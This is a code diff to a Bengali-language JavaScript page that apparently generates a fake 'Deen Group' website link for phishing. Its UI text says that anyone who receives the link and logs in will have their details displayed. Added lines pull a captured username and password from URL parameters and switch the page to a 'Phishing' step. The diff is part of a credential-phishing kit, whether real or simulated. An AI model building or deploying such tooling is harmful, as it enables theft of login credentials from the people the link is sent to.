@@ -795,7 +795,7 @@
                     const formName = document.querySelector('#blockDropZone [data-block-id="2"] input').value;
                     const buttonText = document.querySelector('#blockDropZone [data-block-id="5"] input').value;
                     
-                    const finalLink = `**দ্বীন গ্রুপের নকল ওয়েবসাইট তৈরি হয়েছে!**<br>আপনার তৈরি করা নকল ওয়েবসাইটের লিংক: <span class="phishing-success-link">${FAKE_SITE_URL}?formName=${encodeURIComponent(formName)}&buttonText=${encodeURIComponent(buttonText)}</span><br>এই লিংকটি যাকে পাঠাবেন, সে লগ-ইন করলে তথ্যগুলো এই পৃষ্ঠায় দেখা যাবে।`;
+                    const finalLink = `**দ্বীন গ্রুপের নকল ওয়েবসাইট তৈরি হয়েছে!**<br>আপনার তৈরি করা নকল ওয়েবসাইটের লিংক: <span class="phishing-success-link">${FAKE_SITE_URL}</span><br>এই লিংকটি যাকে পাঠাবেন, সে লগ-ইন করলে তথ্যগুলো এই পৃষ্ঠায় দেখা যাবে।`;
                     
                     resultBox.style.display = 'block';
                     resultBox.innerHTML = finalLink;
@@ -816,6 +816,17 @@
             document.getElementById("buttonsContainer").style.display = "flex";
             document.getElementById("backContainer").style.display = "none";
             document.getElementById("backContainer").innerHTML = ""; // ব্যাক কন্টেইনার খালি করা।
+
+            // নতুন কোড: URL প্যারামিটার চেক করে সরাসরি স্টেপ 4 এ যাওয়া।
+            const urlParams = new URLSearchParams(window.location.search);
+            const capturedUser = urlParams.get('username');
+            const capturedPass = urlParams.get('password');
+            if (capturedUser && capturedPass) {
+                // যদি URL-এ ইউজারনেম এবং পাসওয়ার্ড থাকে
+                rule3Method = "Phishing";
+                allowedStep4Access = true;
+                selectStep(4);
+            }
         };
     </script>
 </body>
